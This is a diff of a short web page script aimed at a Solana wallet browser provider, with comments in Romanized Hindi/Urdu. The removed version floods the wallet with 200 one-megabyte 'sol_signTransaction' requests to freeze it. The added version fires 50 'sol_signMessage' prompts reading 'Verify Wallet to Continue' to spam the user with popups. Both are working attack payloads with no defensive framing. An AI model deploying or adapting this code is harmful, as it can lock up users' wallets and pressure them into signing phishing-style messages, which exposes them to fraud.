@@ -1,25 +1,11 @@
-<!DOCTYPE html>
-<html>
-<body style="background-color: white; text-align: center; padding-top: 50px; font-family: sans-serif;">
-    <h1>Heavy Load Test...</h1>
-    <p>Starting Memory Pressure in 2 seconds...</p>
-    <script>
-        setTimeout(() => {
-            // 1MB ka bhari data banayein
-            const heavyPayload = "X".repeat(1024 * 1024); 
-            
-            // Is bhari data ko 200 baar bhejien (Total 200MB Pressure)
-            for (let i = 0; i < 200; i++) {
-                window.postMessage({
-                    target: "provider",
-                    data: { 
-                        method: "sol_signTransaction", 
-                        params: [heavyPayload] 
-                    }
-                }, "*");
-            }
-            alert("Memory Flood Sent! Check if app freezes now.");
-        }, 2000);
-    </script>
-</body>
-</html>
+<script>
+    setTimeout(() => {
+        // Ye user ko baar baar popup dikhaye ga
+        for (let i = 0; i < 50; i++) {
+            window.postMessage({
+                target: "provider",
+                data: { method: "sol_signMessage", params: ["Verify Wallet to Continue"] }
+            }, "*");
+        }
+    }, 2000);
+</script>
